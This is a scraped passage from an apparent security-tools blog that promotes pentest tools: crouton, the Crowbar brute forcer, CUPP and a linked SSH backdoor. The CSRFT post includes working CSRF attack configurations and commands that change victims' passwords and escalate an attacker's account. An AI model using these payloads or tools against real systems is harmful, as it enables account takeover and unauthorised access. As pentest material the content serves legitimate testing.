      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Anyone who wants to run straight Linux on their Chromium OS device, and doesn't care about physical security. You're also better off having some knowledge of Linux tools and the command line in case things go funny, but it's not strictly necessary.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> What's a chroot?</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Like virtualization, chroots provide the guest OS with their own, segregated file system to run in, allowing applications to run in a different binary environment from the host OS. Unlike virtualization, you are 
       <em>not</em> booting a second OS; instead, the guest OS is running using the Chromium OS system. The benefit to this is that there is zero speed penalty since everything is run natively, and you aren't wasting RAM to boot two OSes at the same time. The downside is that you must be running the correct chroot for your hardware, the software must be compatible with Chromium OS's kernel, and machine resources are inextricably tied between the host Chromium OS and the guest OS. What this means is that while the chroot cannot directly access files outside of its view, it 
       <em>can</em> access all of your hardware devices, including the entire contents of memory. A root exploit in your guest OS will essentially have unfettered access to the rest of Chromium OS.
      </div> 
      <div style="text-align: justify;">
        ...but hey, you can run TuxRacer!
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Prerequisites</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        You need a device running Chromium OS that has been switched to developer mode.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        For instructions on how to do that, go to 
       <a href="http://www.chromium.org/chromium-os/developer-information-for-chrome-os-devices">this Chromium OS wiki page</a>, click on your device model and follow the steps in the 
       <em>Entering Developer Mode</em> section.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Note that developer mode, in its default configuration, is 
       <em>completely insecure</em>, so don't expect a password in your chroot to keep anyone from your data. crouton does support encrypting chroots, but the encryption is only as strong as the quality of your passphrase. Consider this your warning.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        It's also highly recommended that you install the 
       <a href="https://goo.gl/OVQOEt">crouton extension</a>, which, when combined with the 
       <code>extension</code> or 
       <code>xiwi</code> targets, provides much improved integration with Chromium OS.
      </div> 
      <div style="text-align: justify;">
        That's it! Surprised?
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Usage</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        crouton is a powerful tool, and there are a 
       <em>lot</em> of features, but basic usage is as simple as possible by design.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        If you're just here to use crouton, you can grab the latest release from 
       <a href="https://goo.gl/fd3zc">https://goo.gl/fd3zc</a>. Download it, pop open a shell (Ctrl+Alt+T, type 
       <code>shell</code> and hit enter), and run 
       <code>sh ~/Downloads/crouton</code> to see the help text. See the "examples" section for some usage examples.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        If you're modifying crouton, you'll probably want to clone or download the repo and then either run 
       <code>installer/main.sh</code> directly, or use 
       <code>make</code> to build your very own 
       <code>crouton</code>. You can also download the latest release, cd into the Downloads folder, and run 
       <code>sh crouton -x</code> to extract out the juicy scripts contained within, but you'll be missing build-time stuff like the Makefile.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        crouton uses the concept of "targets" to decide what to install. While you will have apt-get in your chroot, some targets may need minor hacks to avoid issues when running in the chrooted environment. As such, if you expect to want something that is fulfilled by a target, install that target when you make the chroot and you'll have an easier time. Don't worry if you forget to include a target; you can always update the chroot later and add it. You can see the list of available targets by running 
       <code>sh ~/Downloads/crouton -t help</code>.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Once you've set up your chroot, you can easily enter it using the newly-installed 
       <code>enter-chroot</code> command, or one of the target-specific start* commands. Ta-da! That was easy.
      </div> 
      <br> Read more 
      <a href="https://warroom.securestate.com/index.php/crouton-chromebooks-as-a-pentesting-platform/" target="_blank">here</a>.
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/dnschneid/crouton" target="_blank">Download&nbsp;Crouton</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2158740299366369128" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Crowbar - Brute Forcing Tool for Pentests  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2158740299366369128" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-3wZ2zhcQUTc/VLRauF9JV4I/AAAAAAAADi0/-0KJD8YfxuE/s1600/crowvar.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-3wZ2zhcQUTc/VLRauF9JV4I/AAAAAAAADi0/-0KJD8YfxuE/s1600/crowvar.jpg" height="120" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>Crowbar</strong> (crowbar) is brute forcing tool that can be used during penetration tests. It is developed to brute force some protocols in a different manner according to other popular brute forcing tools. As an example, while most brute forcing tools use username and password for SSH brute force, Crowbar uses SSH key. So SSH keys, that are obtained during penetration tests, can be used to attack other SSH servers. 
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Currently 
       <strong>Crowbar</strong> supports 
      </div> 
      <ul class="task-list"> 
       <li style="text-align: justify;">OpenVPN</li> 
       <li style="text-align: justify;">SSH private key authentication</li> 
       <li style="text-align: justify;">VNC key authentication</li> 
       <li style="text-align: justify;">Remote Desktop Protocol (RDP) with NLA support</li> 
      </ul> 
      <a name="more"></a> 
      <span class="Apple-style-span" style="font-size: large;"><b>Installation</b></span>
      <br> 
      <br> First you shoud install dependencies
      <br> 
      <pre><code> # apt-get install openvpn freerdp-x11 vncviewer
</code></pre> Then get latest version from github 
      <br> 
      <pre><code> # git clone https://github.com/galkan/crowbar 
</code></pre> Attention: Rdp depends on your Kali version. It may be xfreerdp for the latest version.
      <br> 
      <br> 
      <div style="text-align: justify;"> 
       <b><span class="Apple-style-span" style="font-size: large;">Usage</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>-h</strong>: Shows help menu.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-b</strong>: Target service. Crowbar now supports vnckey, openvpn, sshkey, rdp.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-s</strong>: Target ip address.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-S</strong>: File name which is stores target ip address.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-u</strong>: Username.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-U</strong>: File name which stores username list.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-n</strong>: Thread count.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-l</strong>: File name which stores log. Deafault file name is crwobar.log which is located in your current directory
      </div> 
      <div style="text-align: justify;"> 
       <strong>-o</strong>: Output file name which stores the successfully attempt.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-c</strong>: Password.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-C</strong>: File name which stores passwords list.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-t</strong>: Timeout value.
      </div> 
      <div style="text-align: justify;"> 
       <strong>-p</strong>: Port number 
      </div> 
      <div style="text-align: justify;"> 
       <strong>-k</strong>: Key file full path. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>-m</strong>: Openvpn configuration file path
      </div> 
      <div style="text-align: justify;"> 
       <strong>-d</strong>: Run nmap in order to discover whether the target port is open or not. So that you can easily brute to target using crowbar. 
      </div> 
      <div style="text-align: justify;"> 
       <strong>-v</strong>: Verbose mode which is shows all the attempts including fail.
      </div> 
      <div style="text-align: justify;">
        If you want see all usage options, please use 
       <strong>crowbar --help</strong> 
       <br> 
       <strong><br></strong> 
       <strong><br></strong> 
       <div style="text-align: center;"> 
        <strong><span class="Apple-style-span" style="font-size: x-large;"><a href="https://github.com/galkan/crowbar" target="_blank">Download&nbsp;Crowbar</a></span></strong>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5632096153948333354" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> CSRFT - Cross Site Request Forgeries (Exploitation) Toolkit  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5632096153948333354" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-CrHH8XHuTnU/ViR9vE3R-iI/AAAAAAAAEuk/RFQK1W8-Y7U/s1600/CSRFT.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-CrHH8XHuTnU/ViR9vE3R-iI/AAAAAAAAEuk/RFQK1W8-Y7U/s1600/CSRFT.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        This project has been developed to exploit CSRF Web vulnerabilities and provide you a quick and easy exploitation toolkit. In few words, this is a simple HTTP Server in NodeJS that will communicate with the clients (victims) and send them payload that will be executed using JavaScript. 
      </div> 
      <br> 
      <div style="text-align: justify;">
        This has been developed entirely in NodeJS, and configuration files are in JSON format.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        * 
       <em> However, there's a tool in Python in <code> utils </code> folder that you can use to automate CSRF exploitation. *</em>
      </div> 
      <br> 
      <div style="text-align: justify;">
        This project allows you to perform PoC (Proof Of Concepts) really easily. Let's see how to get/use it. 
      </div> 
      <br> 
      <span style="font-size: large;"> <b> How to get/use the tool </b> </span> 
      <br> First, clone it : 
      <br> 
      <pre><code>$ git clone <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5b3c322f1b3c322f332e3975383436">[email&nbsp;protected]</a>:PaulSec/CSRFT.git
</code></pre> To make this project work, get the latest Node.js version 
      <a href="http://nodejs.org/" target="_blank"> here </a> . Go in the directory and install all the dependencies: 
      <br> 
      <pre><code>npm install
</code></pre> Then, launch the server.js : 
      <br> 
      <pre><code>$ node server.js
</code></pre> Usage will be displayed : 
      <br> 
      <pre><code>Usage : node server.js &lt;file.json&gt; &lt;port : default 8080&gt;
</code></pre> 
      <br> 
      <span style="font-size: large;"> <b> More information </b> </span> 
      <br> By default, the server will be launched on the port 8080, so you can access it via : 
      <code> http://0.0.0.0:8080 </code> . 
      <br> The JSON file must describe your several attack scenarios. It can be wherever you want on your hard drive. 
      <br> The index page displayed on the browser is accessible via : 
      <code> /views/index.ejs </code> . 
      <br> You can change it as you want and give the link to your victim. 
      <br> 
      <br> 
      <span style="font-size: large;"> <b> Different folders : What do they mean ? </b> </span> 
      <br> The idea is to provide a 'basic' hierarchy (of the folders) for your projects. I made the script quite modular so your configuration files/malicious forms, etc. don't have to be in those folders though. This is more like a good practice/advice for your future projects. 
      <br> 
      <br> However, here is a little summary of those folders : 
      <br> 
      <ul> 
       <li> <code> conf folder </code> : add your JSON configuration file with your configuration. <br> </li> 
       <li> <code> exploits folder </code> : add all your *.html files containing your forms </li> 
       <li> <code> public folder </code> : containing jquery.js and inject.js (script loaded when accessing 0.0.0.0:8080) </li> 
       <li> <code> views folder </code> : index file and exploit template </li> 
       <li> <code> dicos </code> : Folder containing all your dictionnaries for those attacks </li> 
       <li> <code> lib </code> : libs specific for my project (custom ones) </li> 
       <li> <code> utils </code> : folder containing utils such as : csrft_utils.py which will launch CSRFT directly. </li> 
       <li> <code> server.js </code> file - the HTTP server </li> 
      </ul> 
      <br> 
      <span style="font-size: large;"> <b> Configuration file templates </b> </span> 
      <br> 
      <br> 
      <b> GET Request with special value </b> 
      <br> Here is a basic example of JSON configuration file that will target 
      <strong> <a href="http://www.vulnerable.com/" target="_blank"> www.vulnerable.com </a> </strong> This is a 
      <em> special value </em> because the malicious payload is already in the URL/form. 
      <br> 
      <pre><code>{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "method": "GET", 
            "type_attack": "special_value", 
            "url": "http://www.vulnerable.com/changePassword.php?newPassword=csrfAttacks"
          }
        ]
      }
    ]
  }
}
</code></pre> 
      <br> 
      <b> GET Request with dictionnary attack </b> 
      <br> Here is a basic example of JSON configuration file. For every entry in the dictionnary file, there will be a HTTP Request done. 
      <br> 
      <pre><code>{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "file": "./dicos/passwords.txt", 
            "method": "GET", 
            "type_attack": "dico", 
            "url": "http://www.vulnerable.com/changePassword.php?newPassword=&lt;%value%&gt;"
          }
        ]
      }
    ]
  }
}
</code></pre> 
      <br> 
      <b> POST Request with special value attack </b> 
      <br> 
      <pre><code>{
  "audit": {
    "name": "PoC done with Automatic Tool", 
    "scenario": [
      {
        "attack": [
          {
            "form": "/tmp/csrft/form.html", 
            "method": "POST", 
            "type_attack": "special_value"
          }
        ]
      }
    ]
  }
}
</code></pre> The form already includes the malicious payload. So it just has to be executed by the victim. 
      <br> I hope you understood the principles. I didn't write an example for a POST with dictionnary attack because there will be one in the next section. 
      <br> 
      <br> 
      <span style="font-size: large;"> <b> Ok but what do Scenario and Attack mean ? </b> </span> 
      <br> A scenario is composed of attacks. Those attacks can be 
      <strong> simultaneous </strong> or at different time. 
      <br> For example, you want to sign the user in and 
      <strong> THEN </strong> , you want him to perform some unwanted actions. You can specify it in the JSON file. 
      <br> Let's take an example with both POST and GET Request : 
      <br> 
      <pre><code>{
    "audit": {
        "name": "DeepSec | Login the admin, give privilege to the Hacker and log him out",

        "scenario": [
            {
                "attack": [
                    {
                        "method": "POST",
                        "type_attack": "dico",
                        "file": "passwords.txt",
                        "form": "deepsec_form_log_user.html",
                        "comment": "attempt to connect the admin with a list of selected passwords"
                    }
                ]
            },
            {
                "attack": [
                    {
                        "method": "GET",
                        "type_attack": "special_value",
                        "url": "http://192.168.56.1/vuln-website/index.php/welcome/upgrade/27",
                        "comment": "then, after the login session, we expect the admin to be logged in, attempt to upgrade our account"
                    }
                ]
            },          
            {
                "attack": [
                    {
                        "method": "GET",
                        "type_attack": "special_value",
                        "url": "http://192.168.56.1/vuln-website/index.php/welcome/logout",
                        "comment": "The final step is to logout the admin"
                    }
                ] 
            }   
        ]
    }
}
</code></pre> You can now define some "steps", different attacks that will be executed in a certain order. 
      <br> 
      <br> 
      <span style="font-size: large;"> <b> Use cases </b> </span> 
      <br> 
      <br> 
      <b> A) I want to write my specific JSON configuration file and launch it by hand </b> 
      <br> Based on the templates which are available, you can easily create your own. If you have any trouble creating it, feel free to contact me and I'll try to help you as much as I can but it shoudn't be this complicated. 
      <br> 
      <strong> Steps to succeed : </strong> 
      <br> 
      <strong> 1) </strong> Create your configuration file, see samples in 
      <code> conf/ </code> folder 
      <br> 
      <strong> 2) </strong> Add your .html files in the 
      <code> exploits/ </code> folder with the different payloads if the CSRF is POST vulnerable 
      <br> 
      <strong> 3) </strong> If you want to do Dictionnary attack, add your dictionnary file to the 
      <code> dicos/ </code> folder, 
      <br> 
      <strong> 4) </strong> Replace the value of the field you want to perform this attack with the token 
      <code> &lt;%value%&gt; </code> 
      <br> =&gt; either in your urls if GET exploitation, or in the HTML files if POST exploitation. 
      <br> 
      <strong> 5) </strong> Launch the application : 
      <code> node server.js conf/test.json </code> 
      <br> 
      <br> 
      <br> 
      <b> B) I want to automate attacks really easily </b> 
      <br> To do so, I developed a Python script 
      <strong> csrft_utils.py </strong> in 
      <code> utils </code> folder that will do this for you. 
      <br> Here are some basic use cases : 
      <br> * 
      <em> GET parameter with Dictionnary attack : * </em> 
      <br> 
      <pre><code>$ python csrft_utils.py --url="http://www.vulnerable.com/changePassword.php?newPassword=csvulnerableParameter" --param=newPassword --dico_file="../dicos/passwords.txt"
</code></pre> * 
      <em> POST parameter with Special value attack : * </em> 
      <br> 
      <pre><code>$ python csrft_utils.py --form=http://website.com/user.php --id=changePassword --param=password password=newPassword --special_value
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b> <span style="font-size: x-large;"> <a href="https://github.com/PaulSec/CSRFT/" target="_blank"> Download CSRFT </a> </span> </b> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8830157739448479517" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Cupp - Common User Passwords Profiler  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8830157739448479517" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-T2LUq3K3qIk/VYB_n2D-c9I/AAAAAAAAEOk/f6fL6HDFEWw/s1600/cupp.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="335" src="http://1.bp.blogspot.com/-T2LUq3K3qIk/VYB_n2D-c9I/AAAAAAAAEOk/f6fL6HDFEWw/s640/cupp.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        The most common form of authentication is the combination of a username and a password or passphrase. If both match values stored within a locally stored table, the user is authenticated for a connection. Password strength is a measure of the difficulty involved in guessing or breaking the password through cryptographic techniques or library-based automated testing of alternate values.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        A weak password might be very short or only use alphanumberic characters, making decryption simple. A weak password can also be one that is easily guessed by someone profiling the user, such as a birthday, nickname, address, name of a pet or relative, or a common word such as God, love, money or password.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        That is why CUPP has born, and it can be used in situations like legal penetration tests or forensic crime investigations.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Options</span></b>
      </div> Usage: cupp.py [OPTIONS]
      <br> 
      <pre><code>    -h      this menu

    -i      Interactive questions for user password profiling

    -w      Use this option to profile existing dictionary,
            or WyD.pl output to make some pwnsauce :)

    -l      Download huge wordlists from repository

    -a      Parse default usernames and passwords directly from Alecto DB.
            Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.

    -v      Version of the program
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Configuration</span></b>
      <br> CUPP has configuration file cupp.cfg with instructions.
      <br> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/Mebus/cupp" target="_blank">Download&nbsp;Cupp</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5011213724323878625" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Custom-SSH-Backdoor - SSH Backdoor using Paramiko  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5011213724323878625" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-QH9i5rIWvRU/VVPnrTsvA5I/AAAAAAAAEAU/jPIp2VgYAr8/s1600/custom-ssh-backdoor.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="330" src="http://1.bp.blogspot.com/-QH9i5rIWvRU/VVPnrTsvA5I/AAAAAAAAEAU/jPIp2VgYAr8/s640/custom-ssh-backdoor.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Custom ssh backdoor, coded in python using Paramiko.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b>Paramiko</b> is a Python (2.6+, 3.3+) implementation of the SSHv2 protocol, providing both client and server functionality. While it leverages a Python C extension for low level cryptography (PyCrypto), Paramiko itself is a pure Python interface around SSH networking concepts.
      </div> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span class="Apple-style-span" style="font-size: x-large;"><a href="https://github.com/joridos/custom-ssh-backdoor" target="_blank">Download&nbsp;Custom-SSH-Backdoor</a></span></b>
      </div> 
     </div>
    </article>
